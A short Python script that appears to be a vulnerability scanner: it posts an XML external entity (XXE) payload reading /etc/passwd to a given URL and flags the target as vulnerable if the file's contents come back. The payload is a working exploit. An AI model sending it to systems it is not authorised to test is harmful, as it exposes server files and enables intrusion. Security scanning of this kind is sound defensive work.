import requests

def scan(url):
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        res = requests.post(url, data=payload, headers=headers, timeout=5)
        if "root:" in res.text or "passwd" in res.text:
            return {"status": "Vulnerable", "risk": "High"}
        return {"status": "Safe", "risk": "Low"}
    except:
        return {"status": "Error", "risk": "Unknown"}